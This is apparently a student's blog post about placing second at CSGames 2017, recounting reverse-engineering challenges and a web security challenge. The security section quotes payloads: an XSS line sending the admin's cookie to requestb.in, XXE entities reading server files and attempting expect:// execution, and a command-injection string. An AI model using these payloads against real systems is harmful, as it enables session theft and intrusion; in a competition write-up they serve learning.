title: "CSGames - uOttawa 2nd place!"
keywords:
- competition
- CSGames
- security
- hacking
categories:
- events
tags:
- competition
- CSGames
- security
- hacking
thumbnailImage: https://images.fletchto99.com/blog/2017/april/csgames/thumbnail.png
date: 2017/4/10
---

A few weeks ago I got to participate in the 2017 edition of CSGames on the uOttawa Series A team. We managed to place second overall!

<!-- excerpt -->
{% image center clear https://images.fletchto99.com/blog/2017/april/csgames/banner.png %}

A few weeks ago I got to participate in the 2017 edition of CSGames on the uOttawa Series A team. We managed to place second overall! For those of you who are unfamiliar [CSGames](http://csgames.org/) is an annual coding competition which consists of many computer science related challenges. Universities across Canada (and some from the states) are allowed send up to 2 teams of 10 students to compete. The competition takes place over three days in which there are multiple challenges that contribute towards your team's overall score. Challenges usually consist of 2 team members sharing one computer and working together to come up with a solution. For a full list of the challenges from this year see the [2017 CSGames website](http://2017.csgames.org/#Competitions). Katherine was my partner in crime for the weekend since we both chose to work on the three security related challenges: Reverse Engineering, CSE, and Security.

{% image fancybox center clear https://images.fletchto99.com/blog/2017/april/csgames/1.jpg "Most of the participants in CSGames 2017" %}

# Reverse Challenge: Day 0x1

Upon arrival on friday night Katherine and I competed in our first challenge which was Reverse Engineering. The reverse engineering challenge had 3 questions, two which required reversing a binary file and the third was an encryption algorithm to which the key being used was lost. The first binary was a file server where the documentation was lost. The goal was to determine the credentials used and then create a client to interact with the server. While we were unable to create a fully working client we identified the credentials & commands the server accepted. If you attempted to patch the binary it would start printing errors saying "SRC GUARD 2017".

Next was the encryption algorithm with the lost key. The key was actually a png file however the algorithm only looked at the first few bytes of the file which actually means it was just constants within the PNG header to encrypt the file thus any PNG image could be used to decrypt it. Katherine and I actually never looked at this one since we were too focused on the other ones, one of my the Seed Round members told me how they solved this challenge afterwords. In hindsight I wish we took some time to look at this since it was easy points instead of just focusing on the other ones which were worth more points.

Finally the last and hardest question was to patch a password manager to spit out the password being stored. After initial inspection the password seemed to be printed when the manager was running on a specific hostname & after a specific time. We managed to patch the app however it printed out "cheater" since our patch didn't fully work. Katherine and I ended up placing 9th in this challenge which was to be expected since we didn't make that much progress.

# CSE Reverse challenge: Day 0x2

The next morning Katherine and I had the CSE challenge. The CSE challenge was essentially another reverse engineering challenge, only this time much more complex. For this challenge we were given 3 documents. The first was piece of paper a little larger than the size of a poster containing a bunch of a gates (upon further reading it was the instruction decoder for a custom CPU). The second was a high level diagram of the instruction decoder. Finally the last one was a "top secret" document containing the challenge. To go with all of this we were given an unknown ELF file.

By connecting the dots from the provided information Katherine and I realized that the elf file, after the 4096 bytes of the elf header, was a bunch of machine code containing instructions for this custom CPU. Our first goal was to create a disassembler to help us understand what was going on in this unknown binary. To build the disassembler we needed to manually trace which bits are active for each instruction in the CPU and then map that to the hex value specified by the machine code. This took much longer than expected however we did get a disassembler working!

After creating the disassembler it appeared to be crashing at an instruction which was not a part of the CPU instruction decoder spec and unfortunately we couldn't figure out why this was the case. After the competition was over I asked why and it turns out that the binary was actually storing an encrypted x86 binary within. The goal after a working disassembler was to decrypt the stored x86 binary and figure out what that binary was doing however we didn't make it that far.

Katherine and I were extremely happy with our progress in this challenge placing 4th. It was by far my favourite of the three challenges I participated in and I learned the most from it. This challenge (finally!) actually made use of something I learned in school. Analyzing a binary for an unknown architecture was kind of fun because there wasn't any plug and go solution or any tool that could give us the answer. We were required to do all of the work manually.

{% image fancybox fig-50 left https://images.fletchto99.com/blog/2017/april/csgames/2.jpg "CPU instruction decoder poster" %}
{% image fancybox fig-50 right https://images.fletchto99.com/blog/2017/april/csgames/3.jpg "Disassembler almost done!" %}

# Security Challenge: Day 0x3

The next morning was the [security challenge](https://github.com/ldionmarcil/CSG2017-security), my chance to shine! The premise of this challenge was to find vulnerabilities in a service called "What Time is it as a Service" or wtiiaas for short. I started off with a simple dirb which revealed a directory called `/old/` which shouldn't have been publicly accessible. In that directory there was an encrypted passwords file for an employee account along with the weak xor algorithm used. Essentially we just had to apply the xor algorithm on the file again to decrypt it. After that we were able to login to the employee portal. Once logged in there was a messaging system and an admin who would "respond right away" which was a clear indication of XSS. After a simple `<img src=x onerror=this.src='requestb.in/secret?cookie='+document.cookie />` we were able to dump the admin cookie and steal her session to get the next flag. This was as far as the admin system went so we had to find another target.

Our next target was the wtiiaas API. The API had 2 models: a free model which enabled the developer to send some XML with a free API key to request the current time and a premium model to request the current time with a specific format, however this required a premium API key. After few minutes it appeared that the free API was vulnerable to two attacks. The first being an XSS attack enabling me to exfiltrate files and the second was a SQL injection in the key parameter. Using the XSS I was able to dump the `/etc/passwd` file but not the `/etc/shadow/` file. However I was able to dump the entire API file by file to base64 using a payload similar to `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/index.php" >]>` and then just following the system paths for the includes within the API.

The final part challenge was to get remote code execution on the server. My first thought was to just use an xxe to take control of the system via a crafted entity containing `[<!ENTITY foo SYSTEM "expect://<command>">]` however after multiple failed attempted I realized that the `expect://` command was disabled. So my next guess was that it had something to do with the API... and I was right! By dumping the API files earlier I was able to inspect the source and realize that the time was being retrieved using something like `exec('date')` within PHP. However the premium API allowed you to request a specific time format so it looked more like `echo "<response>".exec('/bin/sh -c \'date +"'.$format.'"\' 2>&1')."</response>";`. As you can see the format variable is being used so let's look at that: `$format = xml_attribute($action,"format");`. Thus the format variable is being retrieved directly from the XML, so a payload using the premium API could be crafted to execute arbitrary commands by inserting something like `%hh%mm%ss' && <command>` where <command> is the command you wish to run. After injection the API would even be kind enough to return the results to us. Unfortunately I didn't manage to dump the premium API key I was unable to exploit this vuln. It turns out getting the premium API key was done via a blind SQL injection in the user-agent header since there was a custom logging API which used this field. I never looked at the `logging.php` file even though I had dumped it...

Overall Katherine and I placed 6th in this challenge however I was quite disappointed with my performance in the securit challenge. I spent too much time trying to get RCE via `expect://` only to realize it was disabled. I also missed a simple SQL injection which could have gotten us quite a few more points. On top of that there was a [theoretical component](https://github.com/ldionmarcil/CSG2017-security/blob/master/Security-theoretical-EN.pdf) to which I only got 24.5 out of the possible 30 points. I did really poor on the theoretical security portion which is something I will be sure to practice more for next year.

# Results

What an awesome weekend! I learned so much about reverse engineering, patching binaries and analyzing unknown files. Unfortunately after all of our efforts Katherine and I didn't place top 3 for any of our individual challenges however Series A (the team we were on) ended up placing 2nd Overall! Originally we had placed 3rd during the competition but due to an error marking we were bumped up to second (0.03% behind first!). We ended up taking home a total of 8 medals this year across the two teams! I can't wait for next year when uOttawa will hopefully bring home the CS Cup! For the results of this year's CSGames you can checkout the [scoreboard](http://scoreboard.csgames.org) on the CSGames website. Oh also _note to self_: BRING SOME DRESS CLOTHING FOR THE BANQUET NEXT YEAR!

{% image fancybox center clear https://images.fletchto99.com/blog/2017/april/csgames/4.jpg "Receiving the 3rd place overall (later it was realized we got 2nd!)" %}

<!-- more -->
